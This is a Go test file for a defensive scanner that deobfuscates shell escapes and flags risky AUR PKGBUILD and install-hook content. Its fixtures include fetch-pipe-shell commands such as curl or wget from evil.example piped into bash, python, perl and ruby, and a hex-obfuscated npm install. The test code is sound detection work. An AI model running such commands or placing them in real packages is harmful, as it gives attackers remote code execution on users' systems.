package aur

import (
	"strings"
	"testing"

	"github.com/mtclinton/defensive-suite/instguard/internal/report"
)

func TestDeobfuscateHexEscapes(t *testing.T) {
	// "npm" as hex: \x6e\x70\x6d
	if got := Deobfuscate(`\x6e\x70\x6d install`); !strings.Contains(got, "npm install") {
		t.Errorf("hex decode=%q", got)
	}
	// ANSI-C quoting form $'\x6e...'
	if got := Deobfuscate(`$'\x62\x75\x6e' x`); !strings.Contains(got, "bun") {
		t.Errorf("ansi-c hex decode=%q", got)
	}
}

func TestDeobfuscateOctalEscapes(t *testing.T) {
	// "npm" octal: \156\160\155
	if got := Deobfuscate(`\156\160\155`); !strings.Contains(got, "npm") {
		t.Errorf("octal decode=%q", got)
	}
}

func TestDeobfuscateQuotingTricks(t *testing.T) {
	tests := []string{`n"p"m`, `n'p'm`, `'npm'`, `np\m`, `"n"pm`}
	for _, in := range tests {
		if got := Deobfuscate(in); !strings.Contains(got, "npm") {
			t.Errorf("Deobfuscate(%q)=%q, expected to contain npm", in, got)
		}
	}
}

func TestDeobfuscatePreservesStructure(t *testing.T) {
	// Pipe and redirect structure must survive so fetch-pipe-shell still matches.
	got := Deobfuscate(`curl http://x | sh`)
	if !strings.Contains(got, "|") {
		t.Errorf("pipe lost: %q", got)
	}
}

func TestDeobfuscateNonPrintableBecomesSpace(t *testing.T) {
	// \x00 (NUL) must not corrupt the string; becomes a space boundary.
	got := Deobfuscate(`a\x00b`)
	if strings.ContainsRune(got, 0) {
		t.Errorf("NUL leaked into decoded output: %q", got)
	}
}

func TestScanFilePlainNpm(t *testing.T) {
	pkgbuild := `pkgname=foo
build() {
  npm install --global evil-cli
}`
	f := ScanFile("PKGBUILD", pkgbuild)
	if len(f) == 0 {
		t.Fatal("plain npm invocation should be flagged")
	}
	got := f[0]
	if got.Severity != report.SeverityHigh || got.Check != "aur" {
		t.Errorf("finding=%+v", got)
	}
}

func TestScanFileObfuscatedNpmIsCritical(t *testing.T) {
	// npm hidden as hex inside the build function.
	pkgbuild := `build() {
  \x6e\x70\x6d install evil
}`
	f := ScanFile("PKGBUILD", pkgbuild)
	if len(f) == 0 {
		t.Fatal("obfuscated npm should be flagged")
	}
	crit := false
	for _, x := range f {
		if x.Severity == report.SeverityCritical {
			crit = true
		}
	}
	if !crit {
		t.Errorf("obfuscated invocation should be Critical: %+v", f)
	}
}

func TestScanFileCurlPipeShell(t *testing.T) {
	content := `post_install() {
  curl -s https://evil.example/x.sh | bash
}`
	f := ScanFile("foo.install", content)
	hit := false
	for _, x := range f {
		if x.Severity == report.SeverityCritical && strings.Contains(x.Title, "piped") {
			hit = true
		}
	}
	if !hit {
		t.Errorf("curl|bash in .install should be critical: %+v", f)
	}
}

// Fix #3: the AUR fetch-pipe-shell matcher must recognise the same interpreters
// as the npm hooks detector — a `curl … | python/perl/ruby …` in a PKGBUILD is
// just as much install-time RCE as `| sh`.
func TestScanFileCurlPipeInterpreters(t *testing.T) {
	cases := map[string]string{
		"python":   "build() {\n  curl https://evil.example/x | python -c 'import os'\n}",
		"python3":  "build() {\n  curl https://evil.example/x | python3 -\n}",
		"perl":     "build() {\n  curl https://evil.example/x | perl\n}",
		"ruby":     "build() {\n  curl https://evil.example/x | ruby\n}",
		"wgetperl": "build() {\n  wget -qO- https://evil.example/x | perl -\n}",
	}
	for label, content := range cases {
		f := ScanFile("PKGBUILD", content)
		hit := false
		for _, x := range f {
			if x.Severity == report.SeverityCritical && strings.Contains(x.Title, "piped") {
				hit = true
			}
		}
		if !hit {
			t.Errorf("%s: curl|%s should be a critical pipe-to-interpreter finding: %+v", label, label, f)
		}
	}
}

func TestScanFileCommentsIgnored(t *testing.T) {
	content := `# npm install would be bad but this is a comment
pkgname=ok`
	if f := ScanFile("PKGBUILD", content); len(f) != 0 {
		t.Errorf("comment mentioning npm should not be flagged: %+v", f)
	}
}

func TestScanFileBenignPKGBUILD(t *testing.T) {
	content := `pkgname=hello
pkgver=1.0
build() {
  make
}
package() {
  make DESTDIR="$pkgdir" install
}`
	if f := ScanFile("PKGBUILD", content); len(f) != 0 {
		t.Errorf("benign PKGBUILD should be clean: %+v", f)
	}
}

func TestKindLabel(t *testing.T) {
	cases := map[string]string{
		"/a/PKGBUILD":    "PKGBUILD",
		"/a/foo.install": "install",
		"/a/bar.hook":    "hook",
		"/a/other":       "aur",
	}
	for p, want := range cases {
		if got := kindLabel(p); got != want {
			t.Errorf("kindLabel(%q)=%q want %q", p, got, want)
		}
	}
}
